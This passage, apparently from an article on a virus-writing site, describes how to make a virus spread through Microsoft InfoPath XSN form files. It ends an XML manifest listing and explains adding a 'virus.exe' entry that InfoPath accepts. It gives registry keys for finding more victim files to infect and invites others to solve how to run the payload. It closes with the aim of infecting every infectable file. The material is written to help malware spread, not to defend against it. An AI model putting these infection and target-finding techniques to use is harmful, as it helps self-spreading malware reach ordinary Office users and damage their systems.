&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:file</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;view1.xsl&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;lang&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;1031&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;viewWidth&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;542px&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;componentId&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;1&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:file<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:file</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;script.js&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;scriptType&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;userEvents&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:file<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:files<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:package<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:importParameters</span> <span style="color: #000066;">enabled</span>=<span style="color: #ff0000;">&quot;yes&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:importParameters<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:documentVersionUpgrade<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:useTransform</span> <span style="color: #000066;">transform</span>=<span style="color: #ff0000;">&quot;&quot;</span> <span style="color: #000066;">minVersionToUpgrade</span>=<span style="color: #ff0000;">&quot;0.0.0.0&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:useTransform<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:documentVersionUpgrade<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:views</span> <span style="color: #000066;">default</span>=<span style="color: #ff0000;">&quot;View 1&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:view</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;View 1&quot;</span> <span style="color: #000066;">caption</span>=<span style="color: #ff0000;">&quot;View 1&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:unboundControls<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:button</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;CTRL1_5&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:button<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:unboundControls<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:mainpane</span> <span style="color: #000066;">transform</span>=<span style="color: #ff0000;">&quot;view1.xsl&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:mainpane<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:view<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:views<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:applicationParameters</span> <span style="color: #000066;">application</span>=<span style="color: #ff0000;">&quot;InfoPath Design Mode&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:solutionProperties</span> <span style="color: #000066;">lastOpenView</span>=<span style="color: #ff0000;">&quot;view1.xsl&quot;</span> <span style="color: #000066;">fullyEditableNamespace</span>=<span style="color: #ff0000;">&quot;http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11&quot;</span> <span style="color: #000066;">scriptLanguage</span>=<span style="color: #ff0000;">&quot;jscript&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:solutionProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:applicationParameters<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:documentSchemas<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:documentSchema</span> <span style="color: #000066;">rootSchema</span>=<span style="color: #ff0000;">&quot;yes&quot;</span> <span style="color: #000066;">location</span>=<span style="color: #ff0000;">&quot;http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11 myschema.xsd&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:documentSchema<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:documentSchemas<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:fileNew<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:initialXmlDocument</span> <span style="color: #000066;">caption</span>=<span style="color: #ff0000;">&quot;Template1&quot;</span> <span style="color: #000066;">href</span>=<span style="color: #ff0000;">&quot;template.xml&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:initialXmlDocument<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:fileNew<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:scripts</span> <span style="color: #000066;">language</span>=<span style="color: #ff0000;">&quot;jscript&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:script</span> <span style="color: #000066;">src</span>=<span style="color: #ff0000;">&quot;script.js&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:script<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:scripts<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:xDocumentClass<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp;</div>
<p>First you can see, that this file is UTF-8 (as any file generated by Infopath). This may be important if you want to modify that file.</p>
<p>As you can see too, it is not important that &lt;xsf:file>-tags contain further information. That means, we can simply add a string "&lt;xsf:file name="virus.exe">&lt;/xsf:file>" to the file, and Infopath will accept it.</p>
<h3><a name="c32"></a>The Problem: Executing the code</h3>
<p>I have not found a solution for that so far, but somehow i'm sure it exists (as anything is that unsecure in Infopath). The idea is to create a script in the OnLoad-Event (again) and execute the virus.exe. Problem: I have not found a way to find, where the files of the archive will be extracted temporaryly. Second idea: Script.js generates a .JS file, which extracts the archive by itself and runs the virus.exe then. Problem: When the .JS file is dropped at a hardcoded path, it does not "know" where the archive was. (I was not able to find out a way that the script.js in the XSN file "knows" where it is.) When the file will be generated at a non-hardcoded path, it will be the system-path, and the same problem happens again. Maybe somebody else finds a solution and can use the rest of the idea then.</p>
<h2><a name="c4"></a>Find more Files</h2>
<p>So far I have just written about infection types. But we also have to find infectable files. And current-directory is good enough for a proof-of-concept virus, but not for further experiences with Infopath.</p>
<p>When I was searching for infectable victims, I used the Registry, and found some very useful Registry-Pathes:</p>
<p>HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\InfoPath\Recent File List</p>
<p>This key contains values of Filenames. The valuename is "File n" where x is a number. You can read it out and infect that file. And as documents are often saved in the same directory, you should also use a full directory-search.</p>
<p> HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\xsn</p>
<p>That key contains a list of the recently used XSN files. There is a value called MRUList, which contains all letters of further values, which contains files - like that:</p>
<pre>
a [C:\Windows\System32\victim1.xsn]
b [D:\Documents and Settings\victim2.xsn]
MRUList [ab]
</pre>
<p>This may also be a nice way to find further files.</p>
<h2><a name="c5"></a>Last words</h2>
<p>This is just the beginning of a very big amount of technique, released by Microsoft recently, for online/web-orientated teamworking. Things like Windows SharePoint Server/Office SharePoint Services are great developements - and also provide much coding (webparts, ect). MS FrontPage (which will be called "SharePoint Designer 2007" soon) has a great new amount of features, which could also become victims. There is much to discover and to develope - we will not rest until any infectable file is infected :-)</p>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp31">Back to index</a>] [<a href="/lib/vsp31.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp31">de</a><a href="/lib/index.php?lang=en&amp;id=vsp31">en</a><a href="/lib/index.php?lang=es&amp;id=vsp31">es</a><a href="/lib/index.php?lang=it&amp;id=vsp31">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp31">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp31">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp31">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp31">ua</a></div>
</body>
</html>
